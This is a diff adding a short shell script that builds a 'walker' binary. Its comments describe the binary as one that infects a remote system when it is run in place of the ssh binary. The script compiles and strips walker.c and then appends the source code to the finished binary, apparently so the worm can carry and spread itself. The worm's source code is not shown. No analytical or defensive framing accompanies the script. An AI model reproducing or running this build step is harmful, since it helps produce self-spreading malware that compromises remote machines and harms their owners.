@@ -1,0 +1,13 @@
+#!/bin/sh
+
+# run this to build 'walker' binary
+# which infects remote system if used
+# instead of ssh binary
+
+cat walker.c|perl beautify|cat>w.c
+./fixsize w.c w2.c
+cc -O2 w2.c -o walker
+strip walker
+cat w2.c>>walker
+rm -f w.c w2.c
+
